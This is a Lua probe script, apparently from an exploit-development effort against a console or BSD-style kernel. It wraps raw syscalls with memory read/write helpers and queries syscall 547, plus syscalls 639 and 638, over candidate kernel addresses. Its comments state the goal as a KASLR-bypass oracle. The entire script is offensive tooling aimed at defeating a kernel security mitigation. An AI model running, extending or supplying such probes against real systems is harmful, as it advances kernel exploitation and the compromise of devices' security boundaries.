-- CRASH_CLASS: LOW
-- PROBE 986a: sys 547 as a mapping oracle over kernel addresses
--
-- 547(start, end, out) answers with a 0x18 record whose low half is the recorded
-- protection for a user mapping. Everything so far only ever asked it about user
-- pages. If it answers for kernel virtual addresses at all, the answer separates
-- mapped from unmapped kernel regions and that is a KASLR oracle with no bug.

print("=== PROBE 986a: VM PROTECTION OVER KERNEL ADDRESSES ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return to_num(v) end return -999 end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end

local pid = to_num(mk(20)())
print(string.format("[A] pid=%u", pid))

local out = memory.alloc(0x40)
local function probe(tag, start, len)
    for i=0,0x3F,4 do wd(out+i, 0xDEADBEEF) end
    local ok, rv = pcall(function()
        return mk(547)(uint64(start), uint64(start+len), uint64(out))
    end)
    if not ok then print(string.format("  [%s] PCALL-FAIL", tag)) return end
    local h,l = hi_lo(rv)
    print(string.format("  [%s] ret=0x%08X_%08X q0=0x%X q1=0x%X q2=0x%X",
        tag, h, l, rq(out), rq(out+8), rq(out+0x10)))
end

-- control: our own page must answer
local own = memory.alloc(0x1000)
probe("own page", addr_of(own), 0x1000)

-- a GPU mapping, which 98a already saw answer with prot 0x33
local sc_mmap = mk(477)
local g = sc_mmap(uint64(0), uint64(0x10000), uint64(7), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
print(string.format("  gpu mmap ret=0x%X", to_num(g)))
if to_num(g) ~= 0 and to_num(g) ~= -1 then probe("gpu page", to_num(g), 0x4000) end

-- kernel candidates: the 13.60 text base, the direct map, and the canonical top
local cands = {
    {"0xFFFFFFFF80000000", 0xFFFFFFFF80000000},
    {"0xFFFFFFFF8A000000", 0xFFFFFFFF8A000000},
    {"0xFFFFFFFF8A9C0000", 0xFFFFFFFF8A9C0000},
    {"0xFFFFFFFF8B000000", 0xFFFFFFFF8B000000},
    {"0xFFFFFFFF8C000000", 0xFFFFFFFF8C000000},
    {"0xFFFFFFFF8E000000", 0xFFFFFFFF8E000000},
    {"0xFFFF800000000000", 0xFFFF800000000000},
}
for _,c in ipairs(cands) do probe(c[1], c[2], 0x1000) end

print("[B] the same addresses through 639 and 638")
for _,c in ipairs(cands) do
    local a = pcall(function() return mk(639)(uint64(c[2]), uint64(c[2]+0x1000), uint64(out)) end)
    local b = pcall(function() return mk(638)(uint64(c[2]), uint64(c[2]+0x1000), uint64(out)) end)
    print(string.format("  %s 639_ok=%s 638_ok=%s q0=0x%X", c[1], tostring(a), tostring(b), rq(out)))
end

print(string.format("[Z] alive pid=%u", to_num(mk(20)())))
print("=== COMPLETE ===")
